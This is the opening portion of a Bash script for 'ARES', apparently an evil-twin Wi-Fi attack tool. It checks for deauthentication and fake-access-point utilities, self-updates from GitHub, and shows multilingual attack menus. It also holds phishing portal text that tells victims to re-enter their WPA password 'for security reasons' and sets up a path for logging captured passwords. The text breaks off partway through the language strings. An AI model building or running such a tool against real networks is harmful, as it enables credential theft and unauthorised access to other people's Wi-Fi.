#!/bin/bash

########## DEBUG Mode ##########
##			      ##
ARES_DEBUG=0
##			      ##
################################

if [[ $EUID -ne 0 ]]; then
        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root."$transparent""
        exit 1
fi

clear

##################################### < CONFIGURATION  > #####################################
DUMP_PATH="/tmp/TMPares"
PASSLOG_PATH="/root/pwlog" # for facebook  and twitter pages
WORK_DIR=`pwd`
localip=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'`
# Deauth duration during handshake capture
revision=4
version=0.01
IP=192.168.1.1 # for hotspot
RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"


general_back="Back"
general_error_1="Not_Found"
general_case_error="Unknown option. Choose again"
general_exitmode="Cleaning and closing"
general_exitmode_1="Disabling monitoring interface"
general_exitmode_2="Disabling interface"
general_exitmode_3="Disabling "$grey"forwarding of packets"
general_exitmode_4="Cleaning "$grey"iptables"
general_exitmode_5="Restoring "$grey"tput"
general_exitmode_6="Restarting "$grey"Network-Manager"
general_exitmode_7="Cleanup performed successfully!"
general_exitmode_8="Thanks for using ARES"
##############################################################################################

# DEBUG MODE = 0 ; DEBUG MODE = 1 [Normal Mode / Developer Mode]
if [ $ARES_DEBUG = 1 ]; then
	## Developer Mode
	export ares_output_device=/dev/stdout
	HOLD="-hold"
else
	## Normal Mode
	export ares_output_device=/dev/null
	HOLD=""
fi

# Delete Log only in Normal Mode !
function conditional_clear() {

	if [[ "$ares_output_device" != "/dev/stdout" ]]; then clear; fi
}

function airmon {
	chmod +x airmon
}
airmon

# Check Updates
function checkupdatess {

	revision_online="$(timeout -s SIGTERM 20 curl -L "https://raw.githubusercontent.com/site/deltaxflux/ares" 2>/dev/null| grep "^revision" | cut -d "=" -f2)"
	if [ -z "$revision_online" ]; then
		echo "?">$DUMP_PATH/Irev
	else
		echo "$revision_online">$DUMP_PATH/Irev
	fi

}

# Animation
function spinner {

	local pid=$1
	local delay=0.15
	local spinstr='|/-\'
		while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
			local temp=${spinstr#?}
			printf " [%c]  " "$spinstr"
			local spinstr=$temp${spinstr%"$temp"}
			sleep $delay
			printf "\b\b\b\b\b\b"
		done
	printf "    \b\b\b\b"
}

# ERROR Report only in Developer Mode
function err_report {
	echo "Error on line $1"
}

if [ "$ARES_DEBUG" = "1" ]; then
        trap 'err_report $LINENUM' ERR
fi

#Function to executed in case of unexpected termination
trap exitmode SIGINT SIGHUP

# KILL ALL
function exitmode {
	conditional_clear
	top
	echo -e "\n\n"$white"["$red"-"$white"] "$red"$general_exitmode"$transparent""

	if ps -A | grep -q aireplay-ng; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"aireplay-ng"$transparent""
		killall aireplay-ng &>$ares_output_device
	fi

	if ps -A | grep -q airodump-ng; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"airodump-ng"$transparent""
		killall airodump-ng &>$ares_output_device
	fi

	if ps a | grep python| grep fakedns; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"python"$transparent""
		kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$ares_output_device
	fi

	if ps -A | grep -q hostapd; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"hostapd"$transparent""
		killall hostapd &>$ares_output_device
	fi

	if ps -A | grep -q lighttpd; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"lighttpd"$transparent""
		killall lighttpd &>$ares_output_device
	fi

	if ps -A | grep -q dhcpd; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"dhcpd"$transparent""
		killall dhcpd &>$ares_output_device
	fi

	if ps -A | grep -q mdk3; then
		echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"mdk3"$transparent""
		killall mdk3 &>$ares_output_device
	fi

	if [ "$WIFI_MONITOR" != "" ]; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_1 "$verde"$WIFI_MONITOR"$transparent""
		./airmon stop $WIFI_MONITOR &> $ares_output_device
	fi


	if [ "$WIFI" != "" ]; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_2 "$verde"$WIFI"$transparent""
		./airmon stop $WIFI &> $ares_output_device
	fi


	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
		echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_3"$transparent""
		sysctl -w net.ipv4.ip_forward=0 &>$ares_output_device
	fi

	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_4"$transparent""
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain

	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_5"$transparent""
	tput cnorm

	if [ $ARES_DEBUG != 1 ]; then

		echo -e ""$white"["$red"-"$white"] "$white"Delete "$grey"files"$transparent""
		rm -R $DUMP_PATH/* &>$ares_output_device
	fi

	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_6"$transparent""
	service network-manager restart &> $ares_output_device; service restart networkmanager &> $ares_output_device; service networking restart &> $ares_output_device &
	echo -e ""$white"["$green"+"$white"] "$green"$general_exitmode_7"$transparent""
	echo -e ""$white"["$green"+"$white"] "$grey"$general_exitmode_8"$transparent""
	sleep 1
	clear
	exit

}

# Generate a list of web interfaces
readarray -t webinterfaces < <(echo -e "Web Interface
\e[1;31mExit"$transparent""
)

# Generate a list of web translations
readarray -t webinterfaceslenguage < <(echo -e "English [ENG]
Spanish[ESP] GERMAN [GER]
\e[1;31m$general_back"$transparent""
)

#Language for Web Interface
#GER
DIALOG_WEB_INFO_GER="Aus Sicherheitsgründen geben sie bitte <b>"$Host_ENC"</b> den WPA2 Schlüssel ein"
DIALOG_WEB_INPUT_GER="Geben sie den WPA2 Schlüssel ein"
DIALOG_WEB_SUBMIT_GER="Bestätigen"
DIALOG_WEB_ERROR_GER="<b><font color=\"red\" size=\"3\">Error</font>:</b> Das eingegebene Passwort ist <b>nicht</b> Korrekt!</b>"
DIALOG_WEB_OK_GER="Die Verbindung wird in wenigen Sekunden wiederhergestellt"
DIALOG_WEB_BACK_GER="$general_back"
DIALOG_WEB_LENGHT_MIN_GER="Das Passwort muss länger als 7 Zeichen sein"
DIALOG_WEB_LENGHT_MAX_GER="Das Passwort muss kürzer als 64 Zeichen sein"

#EN
DIALOG_WEB_INFO_ENG="For security reasons, enter the <b>"$Host_ENC"</b> key to access the Internet"
DIALOG_WEB_INPUT_ENG="Enter your WPA password:"
DIALOG_WEB_SUBMIT_ENG="Submit"
DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b>"
DIALOG_WEB_OK_ENG="Your connection will be restored in a few moments."
DIALOG_WEB_BACK_ENG="$general_back"
DIALOG_WEB_LENGHT_MIN_ENG="The password must be more than 7 characters"
DIALOG_WEB_LENGHT_MAX_ENG="The password must be less than 64 characters"

#ESP
DIALOG_WEB_INFO_ESP="Por razones de seguridad, introduzca la contrase&ntilde;a <b>"$Host_ENC"</b> para acceder a Internet"
DIALOG_WEB_INPUT_ESP="Introduzca su contrase&ntilde;a WPA:"
DIALOG_WEB_SUBMIT_ESP="Enviar"
DIALOG_WEB_ERROR_ESP="<b><font color=\"red\" size=\"3\">Error</font>:</b> La contrase&ntilde;a introducida <b>NO</b> es correcta!</b>"
DIALOG_WEB_OK_ESP="Su conexi&oacute;n se restablecer&aacute; en breves momentos."
DIALOG_WEB_BACK_ESP="Atr&aacute;s"
DIALOG_WEB_LENGHT_MIN_ESP="La clave debe ser superior a 7 caracteres"
DIALOG_WEB_LENGHT_MAX_ESP="La clave debe ser inferior a 64 caracteres"

#IT
DIALOG_WEB_INFO_IT="Per motivi di sicurezza, immettere la chiave <b>"$Host_ENC"</b> per accedere a Internet"
DIALOG_WEB_INPUT_IT="Inserisci la tua password WPA:"
DIALOG_WEB_SUBMIT_IT="Invia"
DIALOG_WEB_ERROR_IT="<b><font color=\"red\" size=\"3\">Errore</font>:</b> La password <b>NON</b> &egrave; corretta!</b>"
DIALOG_WEB_OK_IT="La connessione sar&agrave; ripristinata in pochi istanti."
DIALOG_WEB_BACK_IT="Indietro"
DIALOG_WEB_LENGHT_MIN_IT="La password deve essere superiore a 7 caratteri"
DIALOG_WEB_LENGHT_MAX_IT="La password deve essere inferiore a 64 caratteri"

#FR
DIALOG_WEB_INFO_FR="Pour des raisons de s&eacute;curit&eacute;, veuillez introduire <b>"$Host_ENC"</b> votre cl&eacute; pour acceder &agrave; Internet"
DIALOG_WEB_INPUT_FR="Entrez votre cl&eacute; WPA:"
DIALOG_WEB_SUBMIT_FR="Valider"
DIALOG_WEB_ERROR_FR="<b><font color=\"red\" size=\"3\">Error</font>:</b> La cl&eacute; que vous avez introduit <b>NOT</b> est incorrecte!</b>"
DIALOG_WEB_OK_FR="Veuillez patienter quelques instants."
DIALOG_WEB_BACK_FR="Pr&eacute;c&eacute;dent"
DIALOG_WEB_LENGHT_MIN_FR="La passe dois avoir plus de 7 digits"
DIALOG_WEB_LENGHT_MAX_FR="La passe dois avoir moins de 64 digits"

#POR
DIALOG_WEB_INFO_POR="Por raz&#245;es de seguran&#231;a, digite a senha para acessar a Internet"
DIALOG_WEB_INPUT_POR="Digite sua senha WPA"
DIALOG_WEB_SUBMIT_POR="Enviar"
DIALOG_WEB_ERROR_POR="<b><font Color=\"red\" size=\"3\">Erro</font>:</b> A senha digitada <b>N&#195;O</b> est&#225; correto </b>!"
DIALOG_WEB_OK_POR="Sua conex&#227;o &#233; restaurada em breve."
DIALOG_WEB_BACK_POR="Voltar"
DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"

# Design
function top(){

	conditional_clear
	echo -e "$blue#########################################################"
	echo -e "$blue#                                                       #"
  echo -e "$blue#  $red    ARES $version" "${yellow} ${red}  < A""${yellow}RES" "${red}I""${yellow}s" "${red}A N""${yellow}etwork ""${red}T""${yellow}ool >   "        ${blue}"      #"
	echo -e "$blue#           "${yellow} by "${red}D""${yellow}eltax &  ${red}"P""${yellow}"rinceofguilty"          "               ${blue}#"
	echo -e "$blue#                                                       #"
	echo -e "$blue#########################################################""$transparent"
	echo
	echo

}

##################################### < END OF CONFIGURATION SECTION > #####################################






############################################## < START > ##############################################

# Check requirements
function checkdependences {

	echo -ne "Aircrack-ng....."
	if ! hash aircrack-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Aireplay-ng....."
	if ! hash aireplay-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Airmon-ng......."
	if ! hash airmon-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Airodump-ng....."
	if ! hash airodump-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Awk............."
	if ! hash awk 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Curl............"
	if ! hash curl 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Dhcpd..........."
	if ! hash dhcpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
#		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Hostapd........."
	if ! hash hostapd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Iwconfig........"
	if ! hash iwconfig 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Lighttpd........"
	if ! hash lighttpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Macchanger......"
	if ! hash macchanger 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
	    echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Mdk3............"
	if ! hash mdk3 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1

	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Nmap............"
	if ! [ -f /usr/bin/nmap ]; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Pyrit..........."
	if ! hash pyrit 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Python.........."
	if ! hash python 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Unzip..........."
	if ! hash unzip 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "Xterm..........."
	if ! hash xterm 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "rfkill.........."
        if ! hash rfkill 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

	if [ "$exit" = "1" ]; then
	exit 1
	fi

	sleep 1
	clear
}
top
checkdependences

# Create working directory
if [ ! -d $DUMP_PATH ]; then
	mkdir -p $DUMP_PATH &>$ares_output_device
fi

# Create handshake directory
if [ ! -d $HANDSHAKE_PATH ]; then
        mkdir -p $HANDSHAKE_PATH &>$ares_output_device
fi

#create password log directory
if [ ! -d $PASSLOG_PATH ]; then
        mkdir -p $PASSLOG_PATH &>$ares_output_device
fi



if [ $ARES_DEBUG != 1 ]; then
	echo ""
		   sleep 0.1 && echo -e "$red "
           sleep 0.1 && echo -e ""
sleep 0.1 && echo -e "                 .o.       ooooooooo.   oooooooooooo  .oooooo..o ";
sleep 0.1 && echo -e "                .888.      \`888   \`Y88. \`888'     \`8 d8P'    \`Y8 ";
sleep 0.1 && echo -e "               .8\"888.      888   .d88'  888         Y88bo.      ";
sleep 0.1 && echo -e "              .8' \`888.     888ooo88P'   888oooo8     \`\"Y8888o.  ";
sleep 0.1 && echo -e "             .88ooo8888.    888\`88b.     888    \"         \`\"Y88b ";
sleep 0.1 && echo -e "            .8'     \`888.   888  \`88b.   888       o oo     .d8P ";
sleep 0.1 && echo -e "           o88o     o8888o o888o  o888o o888ooooood8 8\"\"88888P'  ";
sleep 0.1 && echo -e "                                                      ";
sleep 0.2 && echo -e
	echo""

	sleep 1
	echo -e $red"                ARES "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" deltax & princeofguilty"
	sleep 1
	echo -e $green "                   Page:"$red" https://github.com/deltaxflux/ares "$transparent
	sleep 1
	echo -n "                                 Latest rev."
	tput civis
	checkupdatess &
	spinner "$!"
	revision_online=$(cat $DUMP_PATH/Irev)
	echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"
		if [ "$revision_online" != "?" ]; then

			if [ "$revision" != "$revision_online" ]; then

				cp $0 $HOME/ares_rev-$revision.backup
				curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0" -L https://raw.githubusercontent.com/site/deltaxflux/ares -s -o $0
				echo
				echo
				echo -e ""$red"
Updated successfully! Restarting the script to apply the changes ..."$transparent""
				sleep 5
				chmod +x $0
				exec $0

			fi
		fi
	echo ""
	tput cnorm
	sleep 2

fi

# Show info for the selected AP
function infoap {

	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
	echo "INFO WIFI"
	echo
	echo -e "               "$blue"SSID"$transparent" = $Host_SSID / $Host_ENC"
	echo -e "               "$blue"Channel"$transparent" = $channel"
	echo -e "               "$blue"Speed"$transparent" = ${speed:2} Mbps"
	echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL $transparent)"
	echo
}

############################################## < START > ##############################################






############################################### < MENU > ###############################################

# Windows + Resolution
function setresolution {

	function resA {

		TOPLEFT="-geometry 90x13+0+0"
		TOPRIGHT="-geometry 83x26-0+0"
		BOTTOMLEFT="-geometry 90x24+0-0"
		BOTTOMRIGHT="-geometry 75x12-0-0"
		TOPLEFTBIG="-geometry 91x42+0+0"
		TOPRIGHTBIG="-geometry 83x26-0+0"
	}

	function resB {

		TOPLEFT="-geometry 92x14+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 92x36+0-0"
		BOTTOMRIGHT="-geometry 74x20-0-0"
		TOPLEFTBIG="-geometry 100x52+0+0"
		TOPRIGHTBIG="-geometry 74x30-0+0"
	}
	function resC {

		TOPLEFT="-geometry 100x20+0+0"
		TOPRIGHT="-geometry 109x20-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 109x20-0-0"
		TOPLEFTBIG="-geometry  100x52+0+0"
		TOPRIGHTBIG="-geometry 109x30-0+0"
	}
	function resD {
		TOPLEFT="-geometry 110x35+0+0"
		TOPRIGHT="-geometry 99x40-0+0"
		BOTTOMLEFT="-geometry 110x35+0-0"
		BOTTOMRIGHT="-geometry 99x30-0-0"
		TOPLEFTBIG="-geometry 110x72+0+0"
		TOPRIGHTBIG="-geometry 99x40-0+0"
	}
	function resE {
		TOPLEFT="-geometry 130x43+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 130x40+0-0"
		BOTTOMRIGHT="-geometry 132x35-0-0"
		TOPLEFTBIG="-geometry 130x85+0+0"
		TOPRIGHTBIG="-geometry 132x48-0+0"
	}
	function resF {
		TOPLEFT="-geometry 100x17+0+0"
		TOPRIGHT="-geometry 90x27-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 90x20-0-0"
		TOPLEFTBIG="-geometry  100x70+0+0"
		TOPRIGHTBIG="-geometry 90x27-0+0"
}

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
##  A) 1024x600
##  B) 1024x768
##  C) 1280x768
##  D) 1280x1024
##  E) 1600x1200
case $detectedresolution in
	"1024x600" ) resA ;;
	"1024x768" ) resB ;;
	"1280x768" ) resC ;;
	"1366x768" ) resC ;;
	"1280x1024" ) resD ;;
	"1600x1200" ) resE ;;
	"1366x768"  ) resF ;;
		  * ) resA ;;
esac

language
}

function language {

	conditional_clear

	while true; do
		conditional_clear
		top

		echo "Select your language"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" German          "
		echo -e "      "$blue"2)"$transparent" English      "
		echo -e "      "$blue"3)"$transparent" Romanian     "
		echo -e "      "$blue"4)"$transparent" Turkish    "
		echo -e "      "$blue"5)"$transparent" Spain    "
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) german; break ;;
			2 ) english; break ;;
			3 ) romanian; break;;
			4 ) turkish; break;;
			5 ) spain; break;;
			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
		  esac
	done
}

function german {
	header_setinterface="Wähle deine Netzwerk Karte"
	setinterface_error="Es wurden keine Netzwerk Karten gefunden, beende..."

	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_choosescan="Wähle dein Kanal"

	choosescan_option_1="Alle Kanäle"
	choosescan_option_2="Spezifische Kanal(e)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	scanchan_option_1="Einzelner Kanal"
	scanchan_option_2="Mehrere Kanäle"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scan="WIFI Monitor"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scanchan="Scane Netwerke..."
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askAP="Wähle deine Angriffs Methode"
	askAP_option_1="FakeAP - Hostapd ("$red"Empfohlen)"
	askAP_option_2="FakeAP - airbase-ng (Langsame Verbindung)"
	general_back="Zurück"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askauth="Methode um den Handshake zu Prüfen"
	askauth_option_1="Handshake ("$red"Empfohlen)"
	askauth_option_2="Wpa_supplicant(Mehrere Ausfälle)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthforce="Handshake überprüfung"
	deauthforce_option_1="aircrack-ng (Ausfall möglich)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthMENU="*Erfassung des Handshake*"
	deauthMENU_option_1="Überprüfe handshake"
	deauthMENU_option_2="Starte neu"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_webinterface="Wähle deine Strategie"
	header_ConnectionRESET="Wähle deine login Seite"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	general_case_error="Unbekannte Option, wähle neu"
	general_error_1="Nicht gefunden"
	general_error_2="Datei wurde ${red}nicht$transparent gefunden"
	general_back="Zurück"
	general_exitmode="Aufräumen und schließen"
	general_exitmode_1="Deaktivierung des Monitor Interface"
	general_exitmode_2="Deaktivierung des Interface"
	general_exitmode_3="Deaktivierung "$grey"von weiterleiten von Paketen"
	general_exitmode_4="Säubere "$grey"iptables"
	general_exitmode_5="Wiederherstellung von"$grey"tput"
	general_exitmode_6="Neustarten des "$grey"Netzwerk Manager"
	general_exitmode_7="Wiederherstellung war erfolgreich"
	general_exitmode_8="Vielen Dank für das nutzen von ARES"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	selection_1="Mit aktive Nutzer"
	selection_2="Wähle dein Angriffsziel. Um neuzuscannen tippe $red r$transparent"
	generalMenu
}

function english {
	header_setinterface="Select an interface"
	setinterface_error="There are no wireless cards, quit..."

	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_choosescan="Select channel"
	choosescan_option_1="All channels "
	choosescan_option_2="Specific channel(s)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	scanchan_option_1="Single channel"
	scanchan_option_2="Multiple channels"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scan="WIFI Monitor"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_scanchan="Scanning Target"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askAP="Select Attack Option"
	askAP_option_1="FakeAP - Hostapd ("$red"Recommended)"
	askAP_option_2="FakeAP - airbase-ng (Slower connection)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_askauth="METHOD TO VERIFY THE PASSWORD"
	askauth_option_1="Handshake ("$red"Recommended)"
	askauth_option_2="Wpa_supplicant(More failures)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthforce="Handshake check"
	deauthforce_option_1="aircrack-ng (Miss chance)"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_deauthMENU="*Capture Handshake*"
	deauthMENU_option_1="Check handshake"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	header_webinterface="Select your option"
	header_ConnectionRESET="Select Login Page"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	general_back="Back"
	general_error_1="Not_Found"
	general_case_error="Unknown option. Choose again"
	general_exitmode="Cleaning and closing"
	general_exitmode_1="Disabling monitoring interface"
	general_exitmode_2="Disabling interface"
	general_exitmode_3="Disabling "$grey"forwarding of packets"
	general_exitmode_4="Cleaning "$grey"iptables"
	general_exitmode_5="Restoring "$grey"tput"
	general_exitmode_6="Restarting "$grey"Network-Manager"
	general_exitmode_7="Cleanup performed successfully!"
	general_exitmode_8="Thanks for using ARES"
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	selection_1="Active clients"
	selection_2="Select target. For rescan type$red r$transparent"
	generalMenu
}

function romanian {
	header_setinterface="Selecteaza o interfata"
    setinterface_error="Nu este nici o placa de retea wireless, iesire..."

    #
    header_choosescan="Selecteaza canalul"
    choosescan_option_1="Toate canalele "
    choosescan_option_2="Canal specific(s)"
    #
    scanchan_option_1="Un singur canal"
    scanchan_option_2="Canale multiple"
    #
    header_scan="WIFI Monitor"
    #
    header_scanchan="Scaneaza tinta"
    #
    header_askAP="Selecteaza optiunea de atac"
    askAP_option_1="FakeAP - Hostapd ("$red"Recomandat)"
    askAP_option_2="FakeAP - airbase-ng (Conexiune mai lenta)"
    #
    header_askauth="METODA PENTRU VERIFICAREA PAROLEI"
    askauth_option_1="Handshake ("$red"Recomandat)"
    askauth_option_2="Wpa_supplicant(Mai multe eșecuri)"
    #
    header_deauthforce="Verificare Handshake"
    deauthforce_option_1="aircrack-ng (Sansa ratata)"
    #
    header_deauthMENU="*Capturare Handshake*"
    deauthMENU_option_1="Verificare handshake"
    #
    handshakelocation_1="Handshake locatie  (Examplu: $red$WORK_DIR.cap$transparent)"
    handshakelocation_2="Apasa ${yellow}ENTER$transparent to skip"
    #
    header_webinterface="Selecteaza optiunea ta"
    header_ConnectionRESET="Selecteaza pagina de logare"
    #
    general_back="Inapoi"
    general_error_1="Nu a fost gasit"
    general_case_error="Optiune necunoscuta. Incearca din nou"
    general_exitmode="Curatire si inchidere"
    general_exitmode_1="Dezacticati interfata monitorizata"
    general_exitmode_2="Dezactivati interfata"
    general_exitmode_3="Dezactivati "$grey"forwarding of packets"
    general_exitmode_4="Curatire "$grey"iptables"
    general_exitmode_5="Restaurare "$grey"tput"
    general_exitmode_6="Restartare "$grey"Network-Manager"
    general_exitmode_7="Curatire efectuata cu succes!"
    general_exitmode_8="Multumesc pentru ca ati folosit ARES"
    #
    selection_1="Clienti activi"
    selection_2="Selecteaza tinta. Pentru rescanare tastati$red r$transparent"
    generalMenu
}

function turkish {
	header_setinterface="Bir Ag Secin"
    setinterface_error="Wireless adaptorunuz yok, program kapatiliyor..."

    #
    header_choosescan="Kanal Sec"
    choosescan_option_1="Tum Kanallar "
    choosescan_option_2="Sectigim Kanal ya da Kanallar"
    #
    scanchan_option_1="Tek Kanal"
    scanchan_option_2="Coklu Kanal"
    #
    header_scan="Wifi Goruntule"
    #
    header_scanchan="Hedef Taraniyor"
